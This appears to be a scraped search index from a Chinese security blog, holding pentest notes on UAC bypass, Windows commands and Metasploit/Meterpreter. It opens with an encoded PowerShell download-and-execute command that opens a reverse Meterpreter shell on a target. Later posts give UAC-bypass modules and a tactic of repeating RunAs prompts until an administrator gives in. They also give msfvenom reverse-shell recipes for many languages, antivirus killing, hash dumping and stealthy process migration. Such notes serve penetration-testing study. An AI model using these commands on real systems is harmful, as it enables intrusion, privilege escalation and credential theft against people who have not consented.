raw.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;root@kali:~&#x2F;Desktop# 在目标机器上执行 1PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;","categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"}]},{"title":"内网学习--UAC","slug":"内网学习--UAC","date":"2020-11-20T05:09:14.000Z","updated":"2020-11-21T08:16:11.187Z","comments":true,"path":"2020/11/20/内网学习--UAC/","link":"","permalink":"http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/","excerpt":"","text":"UACuac用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。 即在权限不够的情况下，访问系统磁盘的根目录、window目录、Program File目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC认证。 注意 在其Windows Vista及更高版本操作系统中才会有UAC,Windows Vista是微软公司所研发的具有重大创新意义的一个版本，其内核版本号为Windows NT 6.0。 具体的windows版本可以查看https://blog.csdn.net/jincf2011/article/details/6696133。 如果要获取管理员权限，可以通过以下几条： 121，进程已经拥有管理权限控制；2，进程被用户允许通过管理员权限运行。 uac等级 始终通知：最严格的设置，每当程序需要使用高级别的权限的时候都会提示本地用户。 仅在程序试图更改我的计算机时通知我：这是UAC的默设置。当本地的Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户。 仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：与上一条设置的要求相同，但是在提示时用户不简单桌面的亮度。 从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。 将会触发UAC授权的操作 配置Windows Update 增加或删除用户账户 改变用户的账户类型 改变UAC设置 安装ActiveX 安装或移除程序 安装设备驱动程序 设置家长控制 将文件移动或复制到Program Files或Windows目录 查看其他用户文件夹 查看当前用户的UAC等级12WHOAMI &#x2F;Groups | FIND &quot;S-1-16&quot;Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 UAC Bypass123451，白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等。2，DLL 劫持；3，Windows 自身漏洞提权；4，远程注入；5，COM 接口技术。 Metasploit绕过UACbypassuac模块该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell。 12345678910111213141516171819msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacmsf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use if UAC is turned off (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windows x86msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; 注意： 使用bypassuac模块进行提权时，系统当前用户必须在管理员组。 用户账户控制程序UAC设置为默认，即”仅在程序试图更改我的计算机时通知我”。 RunAs模块1234567891011msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;askmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;ask): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME no File name on disk PATH no Location on disk, %TEMP% used if not set SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use (Accepted: PSH, EXE) 注意： use exploit/windows/local/bypassuac_injection set target 1 #设置目标系统类型，1是64位，0是32位 使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。 RunAs攻击的缺点是，程序企图修改计算机设置时，系统会对用户发出提醒。此警报可能会被管理人员认定为攻击。建议多次运行，系统多次对用户发出提醒后，对于缺乏安全意识或不厌其烦的管理人员会点击“是”，从而完成权限提升。 bypassuac_injection模块内存注入，bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。 123456789101112131415msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionmsf5 exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.Exploit target: Id Name -- ---- 0 Windows x86 模块的使用需要选择正确的架构。 bypassuac_fodhelper模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。 123msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelpermsf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit bypassuac_eventvwr模块该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。 123msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwrmsf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit bypassuac_comhijack模块模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。 123msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijackmsf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit Cobalt Strike绕过UAC当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 run whoami /groups 命令，查看当前用户组，如果权限不够，需要先提权，至 Administrator 或者 SYSTEM 权限。然后再通过 elevate 命令使用这些 Bypass UAC 的模块。 右击一个beacon-&gt;执行-&gt;提权-&gt;选择监听器-&gt;选择expuac-token-duplication。 也可以 1elevate uac-token-duplication beacon名字 如果Bypass UAC 的 Beacon shell 是普通用户权限，我们需要在目标机器上点击弹出的对话框来确定是否更改UAC。","categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"}]},{"title":"渗透测试--windows系统信息收集与提权-(1)","slug":"渗透测试--windows系统信息收集与提权-(1)","date":"2020-11-19T21:33:56.000Z","updated":"2020-11-21T08:25:13.722Z","comments":true,"path":"2020/11/20/渗透测试--windows系统信息收集与提权-(1)/","link":"","permalink":"http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(1)/","excerpt":"","text":"Windows 命令行基础列出当前文件清单1234567891011121314151617181920212223PS C:\\Users\\12521\\Desktop&gt; dir 目录: C:\\Users\\12521\\DesktopMode LastWriteTime Length Name---- ------------- ------ ----d----- 2020&#x2F;10&#x2F;28 20:52 CTFToolsd----- 2020&#x2F;11&#x2F;6 17:30 mdd----- 2020&#x2F;11&#x2F;13 14:21 PHP开发资料d----- 2017&#x2F;7&#x2F;19 6:47 RSA-and-LLL-attacks-masterd----- 2020&#x2F;11&#x2F;8 13:43 RSA-masterd----- 2020&#x2F;11&#x2F;12 17:04 steady-learnd----- 2020&#x2F;11&#x2F;6 17:39 大三学习d----- 2020&#x2F;11&#x2F;8 15:04 常用文件-a---- 2020&#x2F;10&#x2F;25 18:05 729 010 Editor.lnk-a---- 2020&#x2F;11&#x2F;16 16:41 0 1.py-a---- 2020&#x2F;10&#x2F;25 10:52 704029 WinHex.exe-a---- 2020&#x2F;11&#x2F;3 0:09 740 XnView.lnk-a---- 2020&#x2F;11&#x2F;16 8:28 179855 大三学习.zip-a---- 2020&#x2F;11&#x2F;12 10:58 1262 天猫双11.lnk-a---- 2020&#x2F;11&#x2F;7 19:21 607 有道云笔记.lnk 复制与合并文件1copy 源文件 目的文件或者是目的目录 1PS C:\\Users\\12521\\Desktop&gt; copy 1.py 2.py 复制1.py到2.py。 合并多个文件 1copy 1.txt+2.txt+3.txt 123.txt 重命名文件1ren 源文件名 新文件名 1PS C:\\Users\\12521\\Desktop&gt; ren 1.py steady.py 输入输出重定向和管道输出重定向将命令输入输入到文件 1PS C:\\Users\\12521\\Desktop&gt; dir &gt; 1.txt 管道显示文本内容显示文本内容，类似于linux下的cat 12PS C:\\Users\\12521\\Desktop&gt; type 2.pyhappy 将内容写入到指定文件中123PS C:\\Users\\12521\\Desktop&gt; echo &quot;good happy&quot; &gt; 2.txtPS C:\\Users\\12521\\Desktop&gt; type 2.txtgood happy 搜索指定文本内容在一个文件或多个文件中搜索指定的文本字符串。当搜索指定的文件后，find 将显示出包含指定字符串的所有行。 1234567891011121314151617find &quot;文本内容&quot; 文件名C:\\Users\\12521\\Desktop&gt;find &#x2F;?在文件中搜索字符串。FIND [&#x2F;V] [&#x2F;C] [&#x2F;N] [&#x2F;I] [&#x2F;OFF[LINE]] &quot;string&quot; [[drive:][path]filename[ ...]] &#x2F;V 显示所有未包含指定字符串的行。 &#x2F;C 仅显示包含字符串的行数。 &#x2F;N 显示行号。 &#x2F;I 搜索字符串时忽略大小写。 &#x2F;OFF[LINE] 不要跳过具有脱机属性集的文件。 &quot;string&quot; 指定要搜索的文本字符串。 [drive:][path]filename 指定要搜索的文件。如果没有指定路径，FIND 将搜索在提示符处键入的文本或者由另一命令产生的文本。 12345C:\\Users\\12521\\Desktop&gt;find &quot;steady&quot; 2.py---------- 2.PYd----- 2020&#x2F;11&#x2F;12 17:04 steady-learn-a---- 2020&#x2F;11&#x2F;16 16:41 0 steady.py findstr命令使用常规表达式搜索文件中的文本模式。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546C:\\Users\\12521\\Desktop&gt;findstr &#x2F;?在文件中寻找字符串。FINDSTR [&#x2F;B] [&#x2F;E] [&#x2F;L] [&#x2F;R] [&#x2F;S] [&#x2F;I] [&#x2F;X] [&#x2F;V] [&#x2F;N] [&#x2F;M] [&#x2F;O] [&#x2F;P] [&#x2F;F:file] [&#x2F;C:string] [&#x2F;G:file] [&#x2F;D:dir list] [&#x2F;A:color attributes] [&#x2F;OFF[LINE]] strings [[drive:][path]filename[ ...]] &#x2F;B 在一行的开始配对模式。 &#x2F;E 在一行的结尾配对模式。 &#x2F;L 按字使用搜索字符串。 &#x2F;R 将搜索字符串作为一般表达式使用。 &#x2F;S 在当前目录和所有子目录中搜索匹配文件。 &#x2F;I 指定搜索不分大小写。 &#x2F;X 打印完全匹配的行。 &#x2F;V 只打印不包含匹配的行。 &#x2F;N 在匹配的每行前打印行数。 &#x2F;M 如果文件含有匹配项，只打印其文件名。 &#x2F;O 在每个匹配行前打印字符偏移量。 &#x2F;P 忽略有不可打印字符的文件。 &#x2F;OFF[LINE] 不跳过带有脱机属性集的文件。 &#x2F;A:attr 指定有十六进位数字的颜色属性。请见 &quot;color &#x2F;?&quot; &#x2F;F:file 从指定文件读文件列表 (&#x2F; 代表控制台)。 &#x2F;C:string 使用指定字符串作为文字搜索字符串。 &#x2F;G:file 从指定的文件获得搜索字符串。 (&#x2F; 代表控制台)。 &#x2F;D:dir 查找以分号为分隔符的目录列表 strings 要查找的文字。 [drive:][path]filename 指定要查找的文件。除非参数有 &#x2F;C 前缀，请使用空格隔开搜索字符串。例如: &#39;FINDSTR &quot;hello there&quot; x.y&#39; 在文件 x.y 中寻找 &quot;hello&quot; 或&quot;there&quot;。&#39;FINDSTR &#x2F;C:&quot;hello there&quot; x.y&#39; 文件 x.y 寻找&quot;hello there&quot;。一般表达式的快速参考: . 通配符: 任何字符 * 重复: 以前字符或类出现零或零以上次数 ^ 行位置: 行的开始 $ 行位置: 行的终点 [class] 字符类: 任何在字符集中的字符 [^class] 补字符类: 任何不在字符集中的字符 [x-y] 范围: 在指定范围内的任何字符 \\x Escape: 元字符 x 的文字用法 \\&lt;xyz 字位置: 字的开始 xyz\\&gt; 字位置: 字的结束 findstr 接受的元字符。 字符 值 . 通配符：任何字符 * 重复：以前字符或类的零次或多次出现 ^ 行位置：行的开始 $ 行位置：行的结尾 [class] 字符类：集合中任何一个字符 [^class] 反类：不在集合中的任何一个字符 [x-y 范围：范围：指定范围内的任何字符 \\x 取消：元字符 x 的文字用途 &lt;xyz 字位置：字首 xyz&gt; 字位置：字尾 递归查找文件递归查找当前目录以及子目录中的后缀为md的文件 123456789101112131415C:\\Users\\12521\\Desktop&gt;for &#x2F;r steady-learn %i in (*.md) do @echo %iC:\\Users\\12521\\Desktop\\steady-learn\\Buuctf.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF--python库zipfile的使用.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF-python库的使用.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF-密码刷题.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF-杂项.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF-杂项刷题.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF-杂项刷题1.mdC:\\Users\\12521\\Desktop\\steady-learn\\CTF杂项手册.mdC:\\Users\\12521\\Desktop\\steady-learn\\Linux命令.mdC:\\Users\\12521\\Desktop\\steady-learn\\Python学习.mdC:\\Users\\12521\\Desktop\\steady-learn\\Wireshark.mdC:\\Users\\12521\\Desktop\\steady-learn\\内存取证.mdC:\\Users\\12521\\Desktop\\steady-learn\\进制介绍.mdC:\\Users\\12521\\Desktop\\steady-learn\\PHP开发学习\\PHP开发环境安装.md for循环命令解释1234for、in和do是for语句的关键字，它们三个缺一不可；%%I是for语句中对形式变量的引用，即使变量l在do后的语句中没有参与语句的执行，也是必须出现的；in之后，do之前的括号不能省略；command1表示字符串或变量，command2表示字符串、变量或命令语句； 命令例子1234C:\\Users\\12521&gt;for %I in (ABC) do echo %IC:\\Users\\12521&gt;echo ABCABC 12345678910111213141516C:\\Users\\12521\\Desktop&gt;for %i in (*.*) do echo &quot;%i&quot;C:\\Users\\12521\\Desktop&gt;echo &quot;010 Editor.lnk&quot;&quot;010 Editor.lnk&quot;C:\\Users\\12521\\Desktop&gt;echo &quot;2.py&quot;&quot;2.py&quot;C:\\Users\\12521\\Desktop&gt;echo &quot;for&quot;&quot;for&quot;C:\\Users\\12521\\Desktop&gt;echo &quot;login2.aspx&quot;&quot;login2.aspx&quot;C:\\Users\\12521\\Desktop&gt;echo &quot;steady.py&quot;&quot;steady.py&quot; windows权限基础 Users：普通用户权限，是系统中最安全的权限(因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。 Administrator：管理员权限，可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等。 System：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。 TrustedInstaller：Windows中的最高权限，对系统文件，即使拥有System权限也无法修改，只有拥有TrustedInstaller权限才可以修改系统文件。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"内网学习--Metasploit使用","slug":"内网学习--Metasploit使用","date":"2020-11-12T14:46:26.000Z","updated":"2020-11-20T02:25:39.331Z","comments":true,"path":"2020/11/12/内网学习--Metasploit使用/","link":"","permalink":"http://s1eady.top/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Metasploit–Meterpreter使用Meterpreter什么是MeterpreterMeterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。 Meterpreter优点 Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件。 它在运行的时候系统时间是变化的 Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。 Meterpreter基础常用命令进入CMD-shell123456meterpreter &gt; shellProcess 4180 created.Channel 3 created.Microsoft WindowsC:\\Users\\Administrator.WEB\\Desktop&gt; 解决中文乱码问题1chcp 65001 或者将终端临时设置为GBK系列编码即可 退出会话1quit # 退出会话 文件系统命令123456cat # 查看文件内容 getwd # 查看当前工作目录 upload # 上传文件到目标机上 download # 下载文件到本机上 edit # 编辑文件 search # 搜索文件 Meterpreter中常用的Shellmsf搜索正向shell与反向shell的payload1search reverse_tcp或者bind_tcp reverse_tcp 常见shell生成1234567891011121314151617181920212223242526Linux：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exePHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl 反向shell使用情况reverse_tcp基于TCP的反弹shell，反向shell是攻击机器不能联通目标机器，目标机器主动连接攻击机器。 PHP-Shell 生成一句话木马 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php 12345➜ Desktop msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=1234 R &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1114 bytes msfconsole 监听端口 123456789msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 攻击IPlhost =&gt; 192.168.0.108msf5 exploit(multi/handler) &gt; set lport 监听端口msf5 exploit(multi/handler) &gt; run[-] Handler failed to bind to 192.168.0.108:1234:- -[*] Started reverse TCP handler on 0.0.0.0:1234 EXE-木马 生成木马 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击IP LPORT=监听端口 -f exe &gt; hacker.exe msfconsole监听端口 123456msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 攻击IPmsf5 exploit(multi/handler) &gt; set LPORT 监听端口msf5 exploit(multi/handler) &gt; exploit reverse_http基于http方式的反向连接，在网速慢的情况下不稳定。 reverse_https基于https方式的反向连接，在网速慢的情况下不稳定。 正向shell使用情况 目标机器不允许某些端口出站。 目标机器不能联通外网，但是我们可以联通目标机器。 目标机器执行木马之后会打开对应的端口，进行shell连接，正向shell就是目标不能连接攻击端，攻击机器主动连接目标机器。 bind_tcp基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。 设置的IP地址和端口就是目标机的。 PHP-Shell 生成一句话木马 1msfvenom -p php&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php msfconsole监听端口 1234567msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;bind_tcppayload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IPlhost &#x3D;&gt; 192.168.0.108msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口msf5 exploit(multi&#x2F;handler) &gt; run EXE-木马 生成木马 1msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;&lt;Attack Port&gt; -f exe &gt;&#x2F;root&#x2F;bind_xx.exe msfconsole监听端口 123msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcppayload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 升级正常的Shell到Meterpreter通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell, 因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions Command 可以帮助我们实现从Shell 到Meterpreter提升。 12345678910111213msf5&gt;run post/multi/manage/shell_to_meterpretermsf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.msf5&gt;set session 2msf5&gt;run 使用一下命名进行切换 1sessions -u sessionid 会话操作基本操作12sessions #查看会话sessions -i &lt;ID值&gt; #进入会话 将回话保存到后台，进入会话12345meterpreter &gt; background[*] Backgrounding session 1...切换到会话1msf5 exploit(multi/handler) &gt; sessions -i 1[*] Starting interaction with 1... 查看会话12345678msf5 &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ STU1 172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6) 删除回话1234msf5 exploit(multi/script/web_delivery) &gt; sessions -k 2[*] Killing the following session(s): 2[*] Killing session 2[*] 172.20.10.10 - Meterpreter session 2 closed. 抓取hash密码–需要AUTHORITY\\SYSTEM权限 进程迁移在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的第一步就是将其迁移，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。 查看当前活跃进程12345678910111213141516meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 124 500 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 256 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 340 332 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 392 332 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 404 384 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 440 384 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 500 392 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 获取当前进程的PID12meterpreter &gt; getpidCurrent pid: 1912 杀死进程1kill &lt;pid值&gt; 迁移进程1migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中 自动迁移进程1自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate 信息收集本机信息收集查看当前用户权限1getuid # 查看权限 查看系统信息12345678meterpreter &gt; sysinfoComputer : WEBOS : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : DE1AYLogged On Users : 3Meterpreter : x86/windows 获取软件安装信息1run post&#x2F;windows&#x2F;gather&#x2F;enum_applications 1234567891011121314151617181920212223meterpreter &gt; run post/windows/gather/enum_applications[*] Enumerating applications installed on WEBInstalled Applications====================== Name Version ---- ------- 360安全卫士 12.0.0.2002 360安全卫士 12.0.0.2002 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789) 1 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789) 1 Microsoft Office 2003 Web Components 12.0.6213.1000 Microsoft Office 2003 Web Components 12.0.6213.1000 关闭杀毒软件1run post&#x2F;windows&#x2F;manage&#x2F;killav 判断是否是虚拟机123run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机meterpreter &gt; run post/windows/gather/checkvm 补丁信息情况与漏洞信息收集在拿到一个反弹shell后，可以用metaspolit的内置模块Local Exploit SuggesterLocal-exploit-suggester，当我们用它来探测某一个系统时，他会告诉我们该系统有哪些exploit可能可以利用。但是由于该工具先是假设一个系统存在所有的相关漏洞，然后根据补丁信息再去排除，所以就导致误报率会高。 1use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 查看补丁信息1234567run post/windows/gather/enum_patches #补丁信息meterpreter &gt; run post/windows/gather/enum_patches[*] Patch list saved to /Users/apple/.msf4/loot/20200906182724_default_172.20.10.6_enum_patches_447671.txt[*] 